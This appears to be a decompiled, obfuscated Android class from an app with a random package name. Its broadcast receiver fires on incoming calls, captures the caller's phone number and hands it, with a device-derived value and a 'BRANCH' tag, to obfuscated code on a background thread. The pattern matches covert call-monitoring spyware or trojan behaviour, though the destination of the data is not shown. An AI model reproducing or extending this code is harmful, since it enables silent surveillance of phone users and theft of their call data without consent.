package com.vdodsodjsdt;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final class CallReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        String stringExtra;
        ej6unYlOWMDF.pYmKDYlAmhudp(context, "context");
        ej6unYlOWMDF.pYmKDYlAmhudp(intent, "intent");
        if (ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(intent.getAction(), "android.intent.action.PHONE_STATE") && ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(intent.getStringExtra("state"), TelephonyManager.EXTRA_STATE_RINGING) && (stringExtra = intent.getStringExtra("incoming_number")) != null) {
            try {
                Thread thread = new Thread(new klTFaDtrPxx8(0, context, new Tt3445ZYXN().ZfQNn8hdWlEQ5cR94249PDsLR(new nJaAHjKQJXHJfGBg47Nwf9ueexVub(zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(context), stringExtra, context.getResources().getText(R.string.BRANCH).toString()))));
                thread.start();
                thread.join();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
